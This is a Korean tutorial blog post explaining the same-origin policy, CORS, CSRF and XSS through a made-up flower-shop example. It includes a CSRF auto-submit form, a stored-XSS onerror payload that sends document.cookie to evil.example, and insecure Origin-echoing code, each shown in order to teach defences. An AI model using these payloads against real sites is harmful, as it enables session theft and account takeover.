---
layout: post
title: 'CORS·CSRF·XSS 웹 보안 — "누가 보냈고, 누가 읽고, 누가 실행하나"'
date: 2026-11-16 09:00:00 +0900
image: /assets/img/cors-csrf-xss/hero.jpg
generated: true
tags: [security, study]
sanitized: true
---

웹 보안 이야기를 하다 보면 세 약어가 꼭 한 묶음으로 나온다. **CORS**, **CSRF**, **XSS**. 이름이 비슷해서 헷갈리지만, 셋은 서로 다른 질문에 답한다. CORS는 "**다른 사이트의 스크립트가 이 응답을 읽어도 되나?**", CSRF는 "**이 요청을 정말 사용자가 보냈나?**", XSS는 "**이 페이지에서 돌고 있는 스크립트가 정말 우리 것인가?**"다. 이 글은 세 질문의 출발점인 **동일 출처 정책**부터 잡고, 실제 HTTP 요청·응답을 따라가며 어디서 막히고 어디서 뚫리는지 확인한다.

<p style="font-size:13px;color:#5f5a68;background:#faf8fc;border-left:3px solid #b9a9cc;padding:8px 12px;border-radius:6px;margin:16px 0;">📝 이 글에 나오는 서비스·도메인·요청 값은 실제 겪은 장애가 아니라, <b>개념을 쉽게 보여주기 위해 지어낸 예시</b>입니다. (도메인은 예시용으로 예약된 <code>.example</code>을 썼습니다.)</p>

<figure style="margin:22px 0;text-align:center;">
<img src="/assets/img/cors-csrf-xss/hero.jpg" alt="보라색 성벽 앞 아치형 문에 문지기가 서 있고, 성벽 위에는 자물쇠가 그려진 방패가 걸려 있으며, 양옆으로 작은 집들이 늘어서 있다" style="max-width:100%;border-radius:12px;">
<figcaption style="font-size:12px;color:#5f5a68;margin-top:8px;">브라우저는 출처(origin)마다 성벽을 친다. CORS는 문을 여는 규칙, CSRF는 문을 몰래 두드리는 공격, XSS는 성 안으로 들어온 첩자다.</figcaption>
</figure>

## 예시 무대 — 꽃 배달 쇼핑몰

무대를 하나 정한다.

- `https://shop.example` — 꽃 배달 쇼핑몰 웹 페이지
- `https://api.shop.example` — 쇼핑몰의 API 서버
- `https://evil.example` — 공격자가 만든 사이트

사용자는 쇼핑몰에 로그인해 있다. 로그인 상태는 **세션 쿠키(session cookie — 서버가 "이 브라우저는 kim으로 로그인했다"를 기억하려고 준 쪽지)** `SID=abc123`으로 유지된다. 브라우저는 이 쿠키를 `shop.example`로 가는 요청마다 **자동으로** 붙인다. 이 "자동으로"가 앞으로 나올 공격 대부분의 뿌리다.

## 출발점 — 동일 출처 정책(SOP)

### 무엇인가

**출처(origin)**는 URL의 **스킴(scheme, `https`) + 호스트(host, `shop.example`) + 포트(port, `443`)** 세 가지 묶음이다. 셋이 모두 같아야 "같은 출처"다.

`https://shop.example/cart`와 비교하면 이렇다.

| URL | 같은 출처? | 이유 |
|---|---|---|
| `https://shop.example/orders` | ✅ | 경로만 다름 (경로는 출처에 안 들어감) |
| `http://shop.example/cart` | ❌ | 스킴 다름 (`http`) |
| `https://shop.example:8443/cart` | ❌ | 포트 다름 |
| `https://api.shop.example/cart` | ❌ | 호스트 다름 (서브도메인도 다른 호스트) |
| `https://evil.example/cart` | ❌ | 호스트 다름 |

**동일 출처 정책(Same-Origin Policy, SOP)**은 브라우저 규칙이다. "**한 출처의 스크립트는 다른 출처의 응답을 읽을 수 없다.**"

### 왜 필요한가

SOP가 없다고 해 보자. 사용자가 `evil.example`을 열면 그 페이지의 스크립트가 `https://shop.example/orders`를 `fetch`한다. 브라우저는 `shop.example` 쿠키를 자동으로 붙이니, 응답에는 **사용자의 주문 내역**이 담겨 온다. 스크립트가 이걸 읽어 공격자 서버로 보내면 끝이다. SOP는 바로 이 "**읽기**"를 막는다.

### 오해하기 쉬운 점 — SOP는 "보내기"를 막지 않는다

SOP가 막는 건 **응답을 스크립트가 읽는 것**이다. **요청이 서버에 도착하는 것 자체는 대부분 막지 않는다.** `<img src>`, `<form action>` 제출, `<script src>` 같은 태그는 원래부터 다른 출처로 요청을 보낼 수 있었다. 웹이 처음부터 그렇게 만들어졌기 때문이다. 이 점이 뒤에서 CSRF로 이어진다.

<!-- diagram: sop-read-vs-send -->
<figure style="margin:22px 0;padding:16px;background:#faf8fc;border:1px solid #e4e0ec;border-radius:12px;max-width:470px;">
<svg style="width:100%;height:auto;display:block;" viewBox="0 0 340 200" role="img" aria-label="동일 출처 정책은 보내기가 아니라 읽기를 막는다. evil.example 페이지의 스크립트가 shop.example로 요청을 보내면 요청은 쿠키와 함께 서버에 도착하고 서버는 처리해 응답한다. 하지만 응답에 CORS 허용 헤더가 없으면 브라우저가 그 응답을 스크립트에 넘겨주지 않는다.">
<defs>
<marker id="sop-p" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="5" markerHeight="5" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#5F0080"/></marker>
<marker id="sop-o" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="5" markerHeight="5" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#b23a00"/></marker>
</defs>
<rect x="8" y="10" width="150" height="180" rx="10" fill="#fff" stroke="#b9a9cc"/>
<text x="83" y="26" font-size="8" font-weight="700" fill="#1a1720" text-anchor="middle">사용자 브라우저</text>
<rect x="20" y="38" width="126" height="44" rx="6" fill="#fff4ee" stroke="#b23a00"/>
<text x="83" y="54" font-size="7" fill="#1a1720" text-anchor="middle">evil.example 페이지</text>
<text x="83" y="68" font-size="6.2" fill="#5f5a68" text-anchor="middle">fetch("https://shop.example/orders")</text>
<rect x="20" y="104" width="126" height="34" rx="6" fill="#f4eff9" stroke="#5F0080"/>
<text x="83" y="118" font-size="7" fill="#1a1720" text-anchor="middle">브라우저 SOP 검사</text>
<text x="83" y="130" font-size="6.2" fill="#5f5a68" text-anchor="middle">응답에 허용 헤더가 있나?</text>
<rect x="20" y="152" width="126" height="28" rx="6" fill="#fff4ee" stroke="#b23a00"/>
<text x="83" y="165" font-size="6.8" fill="#b23a00" text-anchor="middle">없음 → 스크립트는 못 읽음</text>
<text x="83" y="175" font-size="6" fill="#5f5a68" text-anchor="middle">(TypeError: Failed to fetch)</text>
<rect x="210" y="70" width="122" height="62" rx="8" fill="#eaf5ef" stroke="#1f7a4d"/>
<text x="271" y="88" font-size="7.5" font-weight="700" fill="#1a1720" text-anchor="middle">shop.example 서버</text>
<text x="271" y="102" font-size="6.2" fill="#5f5a68" text-anchor="middle">요청 받음 · 쿠키 확인</text>
<text x="271" y="114" font-size="6.2" fill="#5f5a68" text-anchor="middle">주문 내역으로 200 응답</text>
<text x="271" y="125" font-size="6" fill="#b23a00" text-anchor="middle">← 처리는 이미 끝남</text>
<line x1="146" y1="60" x2="208" y2="86" stroke="#b23a00" stroke-width="1.1" marker-end="url(#sop-o)"/>
<text x="178" y="62" font-size="6" fill="#b23a00" text-anchor="middle">① 요청 + 쿠키</text>
<line x1="208" y1="118" x2="148" y2="121" stroke="#5F0080" stroke-width="1.1" marker-end="url(#sop-p)"/>
<text x="178" y="132" font-size="6" fill="#5F0080" text-anchor="middle">② 응답</text>
<line x1="83" y1="138" x2="83" y2="150" stroke="#b23a00" stroke-width="1" marker-end="url(#sop-o)"/>
</svg>
<figcaption style="font-size:12px;color:#5f5a68;margin-top:8px;">SOP는 ②의 응답을 스크립트에 넘겨주지 않을 뿐, ①의 요청이 서버에 닿아 처리되는 것은 막지 않는다.</figcaption>
</figure>

## CORS — "이 출처라면 읽어도 된다"고 서버가 허락하는 규칙

### 무엇인가

그런데 정상적인 경우도 있다. `https://shop.example` 페이지가 `https://api.shop.example`의 API를 불러야 한다. 호스트가 다르니 SOP상 다른 출처다. 이대로면 자기 회사 API 응답도 못 읽는다.

**CORS(Cross-Origin Resource Sharing — 교차 출처 리소스 공유)**는 서버가 **응답 헤더로** "이 출처의 스크립트는 내 응답을 읽어도 된다"고 브라우저에 알려 주는 표준이다. 핵심은 **SOP를 강화하는 장치가 아니라, SOP에 구멍을 내는(완화하는) 장치**라는 점이다.

### 단순 요청 — 헤더 한 줄이면 된다

다음 코드는 쇼핑몰 페이지에서 API 서버의 상품 목록을 가져온다.

```js
// https://shop.example 페이지에서 실행
const res = await fetch("https://api.shop.example/products");
console.log(await res.json());
```

브라우저는 요청에 `Origin` 헤더를 자동으로 붙인다. 서버는 응답에 허용할 출처를 적는다.

```http
GET /products HTTP/1.1
Host: api.shop.example
Origin: https://shop.example

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://shop.example
Content-Type: application/json

[{"id": 1, "name": "튤립 한 단"}]
```

브라우저는 `Access-Control-Allow-Origin` 값이 페이지 출처와 같으니 응답을 스크립트에 넘겨준다. 이 헤더가 없거나 값이 다르면 서버가 200을 줬어도 스크립트는 `TypeError`를 받는다. **차단하는 쪽은 서버가 아니라 브라우저**다. 그래서 `curl`이나 Postman으로는 CORS 에러가 나지 않는다. 그 도구들은 SOP를 지키는 브라우저가 아니기 때문이다.

여기서 "단순 요청(simple request)"은 메서드가 `GET`·`HEAD`·`POST` 중 하나이고, 직접 붙인 헤더가 `Accept`·`Content-Type` 같은 허용 목록 안에 있으며, `Content-Type`이 `application/x-www-form-urlencoded`·`multipart/form-data`·`text/plain` 중 하나인 요청이다. 즉 **HTML `<form>`이 원래 보낼 수 있던 모양의 요청**이다.

### 프리플라이트 — 위험할 수 있는 요청은 먼저 물어본다

`PUT`이나 `DELETE`, 또는 `Content-Type: application/json` 요청은 `<form>`으로는 못 보내던 요청이다. 이런 요청을 다른 출처로 보낼 때 브라우저는 본 요청 전에 **프리플라이트(preflight — 사전 확인) 요청**을 `OPTIONS` 메서드로 먼저 보낸다. "이런 요청 보내도 돼?"라고 묻는 것이다.

<!-- diagram: cors-preflight -->
<figure style="margin:22px 0;padding:16px;background:#faf8fc;border:1px solid #e4e0ec;border-radius:12px;max-width:470px;">
<svg style="width:100%;height:auto;display:block;" viewBox="0 0 340 220" role="img" aria-label="CORS 프리플라이트 순서. 1 브라우저가 OPTIONS 요청에 Origin, Access-Control-Request-Method PUT, Access-Control-Request-Headers content-type을 담아 보낸다. 2 서버가 허용 출처, 허용 메서드, 허용 헤더, Max-Age로 답한다. 3 허용되면 브라우저가 진짜 PUT 요청을 보낸다. 4 서버가 Access-Control-Allow-Origin을 담아 응답하고 스크립트가 읽는다. 허용되지 않으면 진짜 요청은 아예 나가지 않는다.">
<defs>
<marker id="pf-p" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="5" markerHeight="5" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#5F0080"/></marker>
<marker id="pf-g" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="5" markerHeight="5" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#1f7a4d"/></marker>
</defs>
<rect x="10" y="8" width="96" height="26" rx="6" fill="#f4eff9" stroke="#5F0080"/>
<text x="58" y="20" font-size="7.5" fill="#1a1720" text-anchor="middle">브라우저</text>
<text x="58" y="29" font-size="6" fill="#5f5a68" text-anchor="middle">(shop.example 페이지)</text>
<rect x="234" y="8" width="96" height="26" rx="6" fill="#eaf5ef" stroke="#1f7a4d"/>
<text x="282" y="20" font-size="7.5" fill="#1a1720" text-anchor="middle">API 서버</text>
<text x="282" y="29" font-size="6" fill="#5f5a68" text-anchor="middle">(api.shop.example)</text>
<line x1="58" y1="34" x2="58" y2="212" stroke="#e4e0ec" stroke-dasharray="3 3"/>
<line x1="282" y1="34" x2="282" y2="212" stroke="#e4e0ec" stroke-dasharray="3 3"/>
<line x1="58" y1="54" x2="280" y2="54" stroke="#5F0080" stroke-width="1.1" marker-end="url(#pf-p)"/>
<text x="64" y="49" font-size="6.6" font-weight="700" fill="#5F0080">① OPTIONS /cart/items/7 (프리플라이트)</text>
<text x="64" y="64" font-size="6" fill="#5f5a68">Origin: https://shop.example</text>
<text x="64" y="73" font-size="6" fill="#5f5a68">Access-Control-Request-Method: PUT</text>
<text x="64" y="82" font-size="6" fill="#5f5a68">Access-Control-Request-Headers: content-type</text>
<line x1="282" y1="98" x2="60" y2="98" stroke="#1f7a4d" stroke-width="1.1" marker-end="url(#pf-g)"/>
<text x="276" y="93" font-size="6.6" font-weight="700" fill="#1f7a4d" text-anchor="end">② 204 No Content</text>
<text x="276" y="108" font-size="6" fill="#5f5a68" text-anchor="end">Access-Control-Allow-Origin: https://shop.example</text>
<text x="276" y="117" font-size="6" fill="#5f5a68" text-anchor="end">Access-Control-Allow-Methods: GET, PUT, DELETE</text>
<text x="276" y="126" font-size="6" fill="#5f5a68" text-anchor="end">Access-Control-Allow-Headers: content-type</text>
<text x="276" y="135" font-size="6" fill="#5f5a68" text-anchor="end">Access-Control-Max-Age: 600 (10분간 재확인 생략)</text>
<line x1="58" y1="154" x2="280" y2="154" stroke="#5F0080" stroke-width="1.1" marker-end="url(#pf-p)"/>
<text x="64" y="149" font-size="6.6" font-weight="700" fill="#5F0080">③ 진짜 요청: PUT /cart/items/7 {"qty":3}</text>
<line x1="282" y1="174" x2="60" y2="174" stroke="#1f7a4d" stroke-width="1.1" marker-end="url(#pf-g)"/>
<text x="276" y="169" font-size="6.6" font-weight="700" fill="#1f7a4d" text-anchor="end">④ 200 OK + Access-Control-Allow-Origin</text>
<rect x="40" y="186" width="260" height="22" rx="5" fill="#fff4ee" stroke="#b23a00" stroke-width="0.8"/>
<text x="170" y="200" font-size="6.4" fill="#b23a00" text-anchor="middle">②에서 허용이 안 나오면 ③은 아예 나가지 않는다</text>
</svg>
<figcaption style="font-size:12px;color:#5f5a68;margin-top:8px;">프리플라이트는 "form이 원래 못 보내던 요청"을 서버가 미리 허락했을 때만 실제로 보내게 한다.</figcaption>
</figure>

단순 요청과의 차이가 중요하다. 단순 요청은 **일단 서버에 도착해 처리된 뒤** 응답 읽기만 막힌다. 프리플라이트 대상 요청은 허락이 없으면 **서버에 도착조차 하지 않는다.**

### 쿠키를 같이 보낼 때 — 와일드카드 금지

`fetch`는 기본값으로 다른 출처 요청에 쿠키를 싣지 않는다. 실으려면 `credentials: "include"`를 줘야 하고, 서버도 응답에 두 가지를 지켜야 브라우저가 응답을 넘겨준다.

- `Access-Control-Allow-Credentials: true`
- `Access-Control-Allow-Origin`에 `*`(모든 출처)가 아닌 **구체적인 출처 하나**

이 규칙 덕분에 "아무 사이트나 로그인한 사용자 정보로 내 API를 읽게 하는" 설정은 `*`로는 만들 수 없다.

### 흔한 실수 — Origin을 그대로 메아리치기

CORS 에러를 빨리 없애려고 "요청의 `Origin`을 그대로 `Access-Control-Allow-Origin`에 복사"하는 코드를 쓰는 경우가 있다. 다음 코드가 그 위험한 패턴이다.

```js
// ❌ 어떤 출처든 그대로 허용 + 쿠키까지 허용
res.setHeader("Access-Control-Allow-Origin", req.headers.origin);
res.setHeader("Access-Control-Allow-Credentials", "true");
```

이러면 `evil.example`의 스크립트가 `credentials: "include"`로 `/orders`를 불러도 허용 헤더가 붙어 나간다. SOP가 막아 주던 "로그인한 사용자 데이터 읽기"를 **서버가 스스로 열어 준 셈**이다. 허용 출처는 반드시 **고정된 허용 목록(allowlist)**과 정확히 일치하는지 비교한다. 접미사 비교(`endsWith("shop.example")`)도 위험하다. `evilshop.example`도 통과하기 때문이다.

## CSRF — 사용자 브라우저를 빌려 "보내기"만 하는 공격

### 무엇인가

**CSRF(Cross-Site Request Forgery — 사이트 간 요청 위조)**는 공격자 사이트가 사용자의 브라우저를 시켜 **로그인된 사이트로 원치 않는 요청을 보내게** 하는 공격이다. 응답을 읽을 필요가 없다. **요청이 처리되기만 하면** 성공이다.

SOP와 CORS 이야기를 거꾸로 떠올리면 이해가 쉽다.

1. SOP는 **읽기**만 막고 **보내기**는 대부분 막지 않는다.
2. `<form>` 제출은 단순 요청이라 프리플라이트도 없다.
3. 브라우저는 쿠키를 **자동으로** 붙인다(조건은 뒤에서).

세 개를 합치면 공격이 된다.

### 예시 — 배송지 이메일 바꿔치기

쇼핑몰에 이메일 변경 API가 있다고 하자. `POST https://shop.example/account/email`에 폼 형식으로 `email=...`을 보내면, 세션 쿠키로 사용자를 확인하고 이메일을 바꾼다. 이메일을 바꾸면 "비밀번호 재설정" 메일이 공격자에게 가므로 계정 탈취로 이어진다.

공격자는 `evil.example`에 아래 페이지를 올린다. 이 코드는 페이지가 열리자마자 숨은 폼을 쇼핑몰로 자동 제출한다.

```html
<!-- https://evil.example/win-a-prize.html -->
<form id="f" method="POST" action="https://shop.example/account/email">
  <input type="hidden" name="email" value="attacker@evil.example">
</form>
<script>document.getElementById("f").submit();</script>
```

사용자가 "경품 당첨!" 링크를 눌러 이 페이지를 열면, 브라우저는 다음 요청을 보낸다.

```http
POST /account/email HTTP/1.1
Host: shop.example
Origin: https://evil.example
Cookie: SID=abc123
Content-Type: application/x-www-form-urlencoded

email=attacker%40evil.example
```

서버가 쿠키만 보고 판단한다면, 이 요청은 사용자가 직접 보낸 요청과 구별되지 않는다. 이메일이 바뀐다. 응답은 공격자가 읽지 못하지만, 상관없다.

**CORS는 이걸 막지 못한다.** 폼 제출은 CORS 검사 대상이 아니고, 단순 요청이라 프리플라이트도 없다. "CORS 설정을 잘 했으니 CSRF는 괜찮다"는 대표적인 오해다.

### 방어 1 — SameSite 쿠키

쿠키의 `SameSite` 속성은 "**다른 사이트에서 시작된 요청에도 이 쿠키를 붙일지**"를 정한다.

| 값 | 다른 사이트에서 시작된 요청 | 비고 |
|---|---|---|
| `Strict` | 절대 안 붙임 (링크 클릭으로 들어와도 안 붙음) | 가장 강함. 외부 링크로 오면 로그아웃처럼 보임 |
| `Lax` | 최상위 이동(링크 클릭 등)의 `GET`만 붙임. `POST` 폼·`fetch`·`<img>`엔 안 붙임 | 실용적 기본값 |
| `None` | 항상 붙임 (`Secure` 속성 필수) | 다른 사이트에 임베드되는 위젯 등 |

이메일 변경 쿠키가 `SameSite=Lax`였다면, 위 공격의 `POST`에는 `Cookie` 헤더가 빠진다. 서버는 로그인 안 된 요청으로 보고 거절한다. Chrome 계열 브라우저는 2020년부터 `SameSite`를 지정하지 않은 쿠키를 `Lax`로 취급한다. 다만 브라우저마다 기본값이 다를 수 있으니 **명시적으로 적는 게 안전하다.**

```http
Set-Cookie: SID=abc123; Secure; HttpOnly; SameSite=Lax; Path=/
```

주의할 점이 있다. `SameSite`가 말하는 "사이트(site)"는 출처보다 넓다. 대략 **스킴 + 등록 가능한 도메인(`shop.example`)**이 같으면 같은 사이트다. 그래서 `blog.shop.example`과 `shop.example`은 **다른 출처지만 같은 사이트**다. 서브도메인 하나가 공격자 손에 넘어가면 `SameSite`는 그 요청을 막지 못한다. 또 `GET`으로 상태를 바꾸는 API(`GET /account/delete` 같은)는 `Lax`로도 막히지 않는다. **상태 변경은 `GET`으로 만들지 않는다**는 원칙이 여기서도 중요하다.

### 방어 2 — CSRF 토큰

**CSRF 토큰**은 서버가 세션마다 만든 **추측 불가능한 값**을 페이지(폼의 숨은 필드나 메타 태그)에 심고, 상태를 바꾸는 요청마다 그 값을 함께 보내게 하는 방식이다. 공격자 페이지는 SOP 때문에 쇼핑몰 페이지를 **읽을 수 없으니** 토큰 값을 알 수 없다. 쿠키는 자동으로 붙어도 토큰은 자동으로 붙지 않는다는 비대칭을 이용한 것이다.

```html
<form method="POST" action="/account/email">
  <input type="hidden" name="_csrf" value="Q2v8...랜덤값...">
  <input name="email">
</form>
```

Spring Security, Django, Rails 같은 프레임워크는 이 방어를 기본으로 켜 둔다. "CSRF 필터가 귀찮아서 끈다"는 결정은 이유를 따져 보고 내린다. 예를 들어 쿠키를 아예 쓰지 않고 `Authorization` 헤더로 토큰을 직접 보내는 API는 브라우저가 자동으로 붙이는 자격 증명이 없으니 CSRF 위험이 낮다.

### 방어 3 — 출처 헤더 확인

브라우저가 붙이는 `Origin` 헤더와, 요청이 어디서 시작됐는지 알려 주는 **Fetch Metadata** 헤더(`Sec-Fetch-Site: same-origin | same-site | cross-site | none`)를 서버가 확인하는 방법도 있다. 스크립트가 이 헤더들을 위조할 수 없다는 점을 이용한다. 위 공격 요청에는 `Origin: https://evil.example`이 붙어 있으니 상태 변경 요청에서 허용 목록 밖 출처를 거절하면 된다. 단독으로 쓰기보다 `SameSite`와 함께 **겹겹이(defense in depth)** 쓰는 게 일반적이다.

## XSS — 성 안에 들어온 첩자

### 무엇인가

**XSS(Cross-Site Scripting — 사이트 간 스크립팅)**는 공격자가 만든 스크립트가 **피해 사이트의 출처로** 실행되게 만드는 공격이다. 이름은 "크로스 사이트"지만, 핵심은 **공격 코드가 `shop.example` 페이지 안에서 `shop.example`의 권한으로 돈다**는 것이다.

이게 왜 치명적일까. SOP·CORS·CSRF 토큰은 모두 "**다른 출처**의 스크립트"를 막는 장치다. XSS로 들어온 스크립트는 **같은 출처**다. 그래서 위 방어가 전부 무력해진다.

- 같은 출처라 쇼핑몰 API 응답을 마음대로 읽는다 (SOP 무력화)
- 페이지에 심긴 CSRF 토큰도 읽어서 요청에 넣는다 (CSRF 토큰 무력화)
- 같은 사이트 요청이니 `SameSite` 쿠키도 붙는다 (SameSite 무력화)

<!-- diagram: csrf-vs-xss -->
<figure style="margin:22px 0;padding:16px;background:#faf8fc;border:1px solid #e4e0ec;border-radius:12px;max-width:470px;">
<svg style="width:100%;height:auto;display:block;" viewBox="0 0 340 200" role="img" aria-label="CSRF와 XSS 비교. CSRF는 공격 코드가 evil.example에서 돌며 성벽 밖에서 요청만 보낸다. 응답을 읽지 못하고 SameSite 쿠키, CSRF 토큰, Origin 확인으로 막힌다. XSS는 공격 코드가 shop.example 페이지 안에서 돈다. 응답 읽기, 토큰 읽기, 요청 보내기를 모두 할 수 있어 SOP와 CSRF 방어가 무력해진다. 막는 방법은 출력 인코딩과 CSP다.">
<rect x="8" y="8" width="158" height="184" rx="10" fill="#fff" stroke="#b9a9cc"/>
<text x="87" y="24" font-size="8.5" font-weight="700" fill="#1a1720" text-anchor="middle">CSRF</text>
<text x="87" y="36" font-size="6.4" fill="#5f5a68" text-anchor="middle">성벽 밖에서 문만 두드린다</text>
<rect x="20" y="46" width="134" height="22" rx="5" fill="#fff4ee" stroke="#b23a00"/>
<text x="87" y="60" font-size="6.6" fill="#1a1720" text-anchor="middle">공격 코드 위치: evil.example</text>
<text x="24" y="84" font-size="6.6" fill="#1f7a4d">✓ 요청 보내기 (쿠키 자동 첨부)</text>
<text x="24" y="98" font-size="6.6" fill="#b23a00">✗ 응답 읽기 (SOP가 막음)</text>
<text x="24" y="112" font-size="6.6" fill="#b23a00">✗ CSRF 토큰 읽기</text>
<line x1="20" y1="124" x2="154" y2="124" stroke="#e4e0ec"/>
<text x="24" y="138" font-size="6.6" font-weight="700" fill="#5F0080">막는 법</text>
<text x="24" y="152" font-size="6.4" fill="#1a1720">· SameSite 쿠키</text>
<text x="24" y="164" font-size="6.4" fill="#1a1720">· CSRF 토큰</text>
<text x="24" y="176" font-size="6.4" fill="#1a1720">· Origin / Sec-Fetch-Site 확인</text>
<rect x="174" y="8" width="158" height="184" rx="10" fill="#fff" stroke="#5F0080"/>
<text x="253" y="24" font-size="8.5" font-weight="700" fill="#1a1720" text-anchor="middle">XSS</text>
<text x="253" y="36" font-size="6.4" fill="#5f5a68" text-anchor="middle">첩자가 성 안에서 움직인다</text>
<rect x="186" y="46" width="134" height="22" rx="5" fill="#fff4ee" stroke="#b23a00"/>
<text x="253" y="60" font-size="6.6" fill="#1a1720" text-anchor="middle">공격 코드 위치: shop.example 안</text>
<text x="190" y="84" font-size="6.6" fill="#b23a00">✓ 요청 보내기</text>
<text x="190" y="98" font-size="6.6" fill="#b23a00">✓ 응답 읽기 (같은 출처)</text>
<text x="190" y="112" font-size="6.6" fill="#b23a00">✓ CSRF 토큰 읽기</text>
<line x1="186" y1="124" x2="320" y2="124" stroke="#e4e0ec"/>
<text x="190" y="138" font-size="6.6" font-weight="700" fill="#5F0080">막는 법</text>
<text x="190" y="152" font-size="6.4" fill="#1a1720">· 출력 시 문맥별 인코딩</text>
<text x="190" y="164" font-size="6.4" fill="#1a1720">· innerHTML 대신 textContent</text>
<text x="190" y="176" font-size="6.4" fill="#1a1720">· CSP (+ HttpOnly로 피해 축소)</text>
</svg>
<figcaption style="font-size:12px;color:#5f5a68;margin-top:8px;">CSRF는 "보내기"만 가능한 바깥 공격, XSS는 "다 가능한" 안쪽 공격. XSS가 뚫리면 CSRF 방어도 함께 무너진다.</figcaption>
</figure>

### 세 가지 유형

| 유형 | 공격 코드가 어디에 있나 | 예 |
|---|---|---|
| 저장형(Stored) | 서버 DB에 저장돼 여러 사용자에게 계속 노출 | 상품 후기에 스크립트를 심음 |
| 반사형(Reflected) | 요청 값이 응답에 그대로 되비침 | `/search?q=<스크립트>` 링크를 피해자에게 보냄 |
| DOM 기반(DOM-based) | 서버를 거치지 않고 브라우저 JS가 위험하게 DOM에 넣음 | `location.hash` 값을 `innerHTML`로 넣음 |

### 예시 — 상품 후기 하나로 세션 훔치기

쇼핑몰 상품 페이지가 후기를 이렇게 그린다고 하자. 이 코드는 API에서 받은 후기 본문을 HTML로 해석해 화면에 끼워 넣는다.

```js
// ❌ 후기 본문을 HTML로 해석해 삽입
reviewEl.innerHTML = review.body;
```

공격자가 후기 본문에 이렇게 적는다.

```html
<img src="x" onerror="fetch('https://evil.example/c?d='+encodeURIComponent(document.cookie))">
```

`src="x"`는 없는 이미지라 로딩이 실패하고, 실패 시 실행되는 `onerror` 속성의 코드가 돈다. 이 코드는 `shop.example` 페이지 안에서 돌기 때문에 `document.cookie`로 쇼핑몰 쿠키를 읽어 공격자 서버로 보낸다. 상품 페이지를 연 **모든 사용자**에게 일어난다(저장형).

참고로 `innerHTML`로 `<script>` 태그를 넣으면 HTML 표준에 따라 실행되지 않는다. 그래서 공격자는 위처럼 이벤트 속성(`onerror`, `onload` 등)을 쓴다. "`<script>`만 걸러내면 된다"는 필터가 쉽게 뚫리는 이유다.

### 방어 — before / after

**① 출력 인코딩: 데이터를 코드가 아니라 글자로 넣는다.** 다음 코드는 후기 본문을 HTML로 해석하지 않고 순수 텍스트로 넣는다.

```js
// ✅ 후기 본문을 텍스트로만 삽입
reviewEl.textContent = review.body;
```

| | `innerHTML` (before) | `textContent` (after) |
|---|---|---|
| 화면에 보이는 것 | 깨진 이미지 아이콘 | `<img src="x" onerror=...>` 글자 그대로 |
| `onerror` 실행 | ✅ 실행됨 → 쿠키 유출 | ❌ 실행 안 됨 |

서버에서 HTML을 그릴 때도 같다. React의 JSX `{review.body}`, Thymeleaf의 `th:text`처럼 **기본으로 이스케이프(`<` → `&lt;` 같은 변환)하는 방식**을 쓰고, `dangerouslySetInnerHTML`·`th:utext`처럼 이스케이프를 끄는 기능은 꼭 필요할 때만, 검증된 HTML 정화 라이브러리(예: DOMPurify)를 거쳐 쓴다. 인코딩 방식은 **넣는 자리(문맥)**마다 다르다. HTML 본문, 속성 값, URL, JS 문자열은 각자 규칙이 다르니 "하나의 escape 함수로 전부"는 통하지 않는다.

**② CSP: 뚫려도 실행을 막는 두 번째 벽.** **CSP(Content Security Policy — 콘텐츠 보안 정책)**는 "이 페이지에서 어떤 스크립트를 실행해도 되는지"를 응답 헤더로 브라우저에 알려 준다.

```http
Content-Security-Policy: script-src 'self' 'nonce-r4nd0m'; object-src 'none'; base-uri 'none'
```

이 정책 아래에서는 같은 출처에서 불러온 스크립트 파일과, 응답마다 바뀌는 `nonce` 값이 붙은 `<script nonce="r4nd0m">`만 실행된다. 위 `onerror` 같은 **인라인 이벤트 속성은 실행되지 않는다**(`'unsafe-inline'`을 허용하지 않는 한). 인코딩을 한 군데 빠뜨려도 CSP가 한 번 더 막는다.

**③ HttpOnly: 피해를 줄이는 장치.** 세션 쿠키에 `HttpOnly`를 붙이면 `document.cookie`로 읽을 수 없다. 위 공격의 "쿠키 훔치기"는 막힌다. 하지만 공격 스크립트가 **그 자리에서** 쇼핑몰 API로 이메일 변경 요청을 보내는 것은 못 막는다(쿠키는 브라우저가 자동으로 붙이니까). 그래서 `HttpOnly`는 XSS 방어가 아니라 **피해 축소**다. 앞 글(OAuth2·JWT)에서 토큰을 `localStorage`보다 `HttpOnly` 쿠키에 두라고 한 이유도 이것이다.

## 셋을 한 장으로

| | CORS | CSRF | XSS |
|---|---|---|---|
| 정체 | 서버가 SOP를 **완화**하는 규칙 | 공격 | 공격 |
| 핵심 질문 | 다른 출처 스크립트가 응답을 **읽어도** 되나? | 이 요청을 사용자가 **의도**했나? | 이 스크립트가 **우리 것**인가? |
| 공격 코드 위치 | — | 다른 사이트 | 우리 사이트 안 |
| 잘못하면 | Origin 메아리 + Credentials → 데이터 유출 | 쿠키만 믿는 상태 변경 API | 이스케이프 없이 HTML 삽입 |
| 지킬 것 | 허용 출처를 고정 목록과 정확히 비교 | SameSite + CSRF 토큰 + Origin 확인, `GET`으로 상태 변경 금지 | 문맥별 인코딩, CSP, HttpOnly |

세 개의 관계를 한 문장으로 묶으면 이렇다. **CORS는 CSRF를 막지 못하고, CSRF 방어는 XSS 앞에서 무너진다.** 그래서 XSS 방어가 가장 아래 기반이고, 그 위에 CSRF 방어, 그 위에 CORS를 "필요한 만큼만" 연다.

## 한 줄 교훈

**브라우저는 "보내기"는 너그럽고 "읽기"는 엄격하다** — CORS는 읽기 문을 여는 규칙이고, CSRF는 너그러운 보내기를 노리고, XSS는 아예 성 안에서 둘 다 해 버리니, 방어는 XSS부터 쌓는다.
